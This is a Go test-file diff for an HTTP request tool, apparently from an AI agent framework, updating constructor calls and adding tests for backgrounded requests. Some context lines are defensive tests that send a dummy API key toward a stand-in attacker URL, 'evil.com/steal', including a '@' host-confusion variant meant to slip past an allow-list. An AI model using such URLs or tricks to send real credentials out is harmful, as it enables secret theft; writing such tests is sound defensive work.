@@ -36,7 +36,7 @@ func TestHTTPRequestBasicGET(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	tool := NewHTTPRequestTool(nil, nil, "")
+	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/test",
 	})
@@ -72,7 +72,7 @@ api_key = "sk-secret-123"
 allowed_hosts = ["%s"]
 `, srv.Listener.Addr().(*net.TCPAddr).IP.String()))
 
-	tool := NewHTTPRequestTool(store, nil, "")
+	tool := NewHTTPRequestTool(store, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/api",
 		"headers": map[string]string{
@@ -101,7 +101,7 @@ api_key = "sk-secret-123"
 allowed_hosts = ["api.allowed.com"]
 `)
 
-	tool := NewHTTPRequestTool(store, nil, "")
+	tool := NewHTTPRequestTool(store, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "https://evil.com/steal",
 		"headers": map[string]string{
@@ -125,7 +125,7 @@ api_key = "sk-secret-123"
 allowed_hosts = ["api.example.com"]
 `)
 
-	tool := NewHTTPRequestTool(store, nil, "")
+	tool := NewHTTPRequestTool(store, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "https://api.example.com@evil.com/steal",
 		"headers": map[string]string{
@@ -148,7 +148,7 @@ func TestHTTPRequestNoAllowedHosts(t *testing.T) {
 token = "sk-legacy-token"
 `)
 
-	tool := NewHTTPRequestTool(store, nil, "")
+	tool := NewHTTPRequestTool(store, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "https://api.example.com/data",
 		"headers": map[string]string{
@@ -172,7 +172,7 @@ func TestHTTPRequestNoSecretsNoRestriction(t *testing.T) {
 	defer srv.Close()
 
 	// nil store — no secrets at all
-	tool := NewHTTPRequestTool(nil, nil, "")
+	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/public",
 	})
@@ -200,7 +200,7 @@ api_key = "sk-supersecret-should-be-redacted"
 allowed_hosts = ["%s"]
 `, srv.Listener.Addr().(*net.TCPAddr).IP.String()))
 
-	tool := NewHTTPRequestTool(store, nil, "")
+	tool := NewHTTPRequestTool(store, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/echo",
 		"headers": map[string]string{
@@ -227,7 +227,7 @@ func TestHTTPRequestQueryParams(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	tool := NewHTTPRequestTool(nil, nil, "")
+	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/search",
 		"query": map[string]string{
@@ -260,7 +260,7 @@ key = "key-b"
 allowed_hosts = ["other.example.com"]
 `)
 
-	tool := NewHTTPRequestTool(store, nil, "")
+	tool := NewHTTPRequestTool(store, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "https://api.example.com/data",
 		"headers": map[string]string{
@@ -287,7 +287,7 @@ func TestHTTPRequestSaveToText(t *testing.T) {
 	defer srv.Close()
 
 	savePath := filepath.Join(t.TempDir(), "output.json")
-	tool := NewHTTPRequestTool(nil, nil, "")
+	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":     srv.URL + "/api",
 		"save_to": savePath,
@@ -326,7 +326,7 @@ func TestHTTPRequestSaveToParentDirs(t *testing.T) {
 	defer srv.Close()
 
 	savePath := filepath.Join(t.TempDir(), "sub", "dir", "output.txt")
-	tool := NewHTTPRequestTool(nil, nil, "")
+	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":     srv.URL,
 		"save_to": savePath,
@@ -355,7 +355,7 @@ func TestHTTPRequestBinaryAutoSave(t *testing.T) {
 	defer srv.Close()
 
 	tmpDir := t.TempDir()
-	tool := NewHTTPRequestTool(nil, nil, tmpDir)
+	tool := NewHTTPRequestTool(nil, nil, tmpDir, 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/image.png",
 	})
@@ -397,7 +397,7 @@ func TestHTTPRequestTextNotAutoSaved(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	tool := NewHTTPRequestTool(nil, nil, "")
+	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL,
 	})
@@ -424,7 +424,7 @@ func TestHTTPRequestSaveFromJSONPath(t *testing.T) {
 	defer srv.Close()
 
 	savePath := filepath.Join(t.TempDir(), "output.txt")
-	tool := NewHTTPRequestTool(nil, nil, "")
+	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":                 srv.URL,
 		"save_to":             savePath,
@@ -467,7 +467,7 @@ func TestHTTPRequestSaveFromJSONPathDataURI(t *testing.T) {
 	defer srv.Close()
 
 	savePath := filepath.Join(t.TempDir(), "image.png")
-	tool := NewHTTPRequestTool(nil, nil, "")
+	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":                 srv.URL,
 		"save_to":             savePath,
@@ -500,7 +500,7 @@ func TestHTTPRequestSaveFromJSONPathDataURI(t *testing.T) {
 }
 
 func TestHTTPRequestSaveFromJSONPathRequiresSaveTo(t *testing.T) {
-	tool := NewHTTPRequestTool(nil, nil, "")
+	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":                 "http://example.com",
 		"save_from_json_path": "data.0.url",
@@ -603,7 +603,7 @@ func TestHTTPRequestCustomTimeout(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	tool := NewHTTPRequestTool(nil, nil, "")
+	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":     srv.URL,
 		"timeout": 60,
@@ -626,7 +626,7 @@ func TestHTTPRequestTimeoutCap(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	tool := NewHTTPRequestTool(nil, nil, "")
+	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
 
 	// Request with 1-second timeout should fail
 	params, _ := json.Marshal(map[string]interface{}{
@@ -653,7 +653,7 @@ func TestHTTPRequestSaveToLargeBody(t *testing.T) {
 	defer srv.Close()
 
 	savePath := filepath.Join(t.TempDir(), "big.bin")
-	tool := NewHTTPRequestTool(nil, nil, "")
+	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":     srv.URL,
 		"save_to": savePath,
@@ -685,7 +685,7 @@ func TestHTTPRequestMaxResponseBytesOverride(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	tool := NewHTTPRequestTool(nil, nil, "")
+	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":                srv.URL,
 		"max_response_bytes": 256 * 1024,
@@ -711,7 +711,7 @@ func TestHTTPRequestMaxResponseBytesLargeOverride(t *testing.T) {
 	defer srv.Close()
 
 	savePath := filepath.Join(t.TempDir(), "big.bin")
-	tool := NewHTTPRequestTool(nil, nil, "")
+	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":                srv.URL,
 		"save_to":            savePath,
@@ -729,5 +729,179 @@ func TestHTTPRequestMaxResponseBytesLargeOverride(t *testing.T) {
 	}
 	if len(data) != 3*1024*1024 {
 		t.Errorf("saved %d bytes, want %d", len(data), 3*1024*1024)
+	}
+}
+
+func TestHTTPRequestAutoBackgroundFast(t *testing.T) {
+	// A fast request should complete before the threshold — no notification
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		fmt.Fprint(w, "fast response")
+	}))
+	defer srv.Close()
+
+	var called bool
+	tool := NewHTTPRequestTool(nil, nil, "", 5, NewAsyncNotifier(func(sk, msg string) {
+		called = true
+	}))
+
+	params, _ := json.Marshal(map[string]interface{}{
+		"url": srv.URL,
+	})
+
+	result, err := tool.Execute(context.Background(), params)
+	if err != nil {
+		t.Fatalf("Execute: %v", err)
+	}
+	if !strings.Contains(result, "fast response") {
+		t.Errorf("result = %q, want 'fast response'", result)
+	}
+	if called {
+		t.Error("notifier should not be called for fast requests")
+	}
+}
+
+func TestHTTPRequestAutoBackgroundSlow(t *testing.T) {
+	// A slow request should auto-background after 1 second
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		time.Sleep(3 * time.Second)
+		fmt.Fprint(w, "slow response")
+	}))
+	defer srv.Close()
+
+	completeCh := make(chan string, 1)
+	tool := NewHTTPRequestTool(nil, nil, "", 1, NewAsyncNotifier(func(sk, msg string) {
+		completeCh <- msg
+	}))
+
+	params, _ := json.Marshal(map[string]interface{}{
+		"url":     srv.URL,
+		"timeout": 10,
+	})
+
+	result, err := tool.Execute(context.Background(), params)
+	if err != nil {
+		t.Fatalf("Execute: %v", err)
+	}
+
+	// Should get the auto-background message
+	if !strings.Contains(result, "still running") {
+		t.Errorf("expected auto-background message, got %q", result)
+	}
+
+	// Wait for the request to complete
+	select {
+	case completed := <-completeCh:
+		if !strings.Contains(completed, "slow response") {
+			t.Errorf("expected 'slow response' in completed message, got %q", completed)
+		}
+		if !strings.Contains(completed, "[HTTP RESULT]") {
+			t.Errorf("expected [HTTP RESULT] prefix, got %q", completed)
+		}
+	case <-time.After(10 * time.Second):
+		t.Fatal("timed out waiting for auto-backgrounded request")
+	}
+}
+
+func TestHTTPRequestAutoBackgroundSessionKey(t *testing.T) {
+	// Verify the session key from context reaches the notifier callback
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		time.Sleep(3 * time.Second)
+		fmt.Fprint(w, "done")
+	}))
+	defer srv.Close()
+
+	type result struct {
+		sk, msg string
+	}
+	ch := make(chan result, 1)
+	tool := NewHTTPRequestTool(nil, nil, "", 1, NewAsyncNotifier(func(sk, msg string) {
+		ch <- result{sk, msg}
+	}))
+
+	params, _ := json.Marshal(map[string]interface{}{
+		"url":     srv.URL,
+		"timeout": 10,
+	})
+
+	ctx := WithSessionKey(context.Background(), "agent:test:branch-42")
+	out, err := tool.Execute(ctx, params)
+	if err != nil {
+		t.Fatalf("Execute: %v", err)
+	}
+	if !strings.Contains(out, "still running") {
+		t.Fatalf("expected auto-background message, got %q", out)
+	}
+
+	select {
+	case r := <-ch:
+		if r.sk != "agent:test:branch-42" {
+			t.Errorf("session key = %q, want %q", r.sk, "agent:test:branch-42")
+		}
+		if r.msg == "" {
+			t.Error("message should not be empty")
+		}
+	case <-time.After(10 * time.Second):
+		t.Fatal("timed out waiting for notifier callback")
+	}
+}
+
+func TestHTTPRequestExplicitBackground(t *testing.T) {
+	// background=true should return immediately and deliver via notifier
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		fmt.Fprint(w, "bg response")
+	}))
+	defer srv.Close()
+
+	completeCh := make(chan string, 1)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, NewAsyncNotifier(func(sk, msg string) {
+		completeCh <- msg
+	}))
+
+	params, _ := json.Marshal(map[string]interface{}{
+		"url":        srv.URL,
+		"background": true,
+	})
+
+	result, err := tool.Execute(context.Background(), params)
+	if err != nil {
+		t.Fatalf("Execute: %v", err)
+	}
+
+	// Should get the background message
+	if !strings.Contains(result, "background") {
+		t.Errorf("expected background message, got %q", result)
+	}
+
+	// Wait for the request to complete
+	select {
+	case completed := <-completeCh:
+		if !strings.Contains(completed, "bg response") {
+			t.Errorf("expected 'bg response' in completed message, got %q", completed)
+		}
+	case <-time.After(5 * time.Second):
+		t.Fatal("timed out waiting for background request")
+	}
+}
+
+func TestHTTPRequestBackgroundNoNotifier(t *testing.T) {
+	// background=true but no notifier — should run synchronously
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		fmt.Fprint(w, "sync response")
+	}))
+	defer srv.Close()
+
+	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+
+	params, _ := json.Marshal(map[string]interface{}{
+		"url":        srv.URL,
+		"background": true,
+	})
+
+	result, err := tool.Execute(context.Background(), params)
+	if err != nil {
+		t.Fatalf("Execute: %v", err)
+	}
+	if !strings.Contains(result, "sync response") {
+		t.Errorf("expected sync response, got %q", result)
 	}
 }
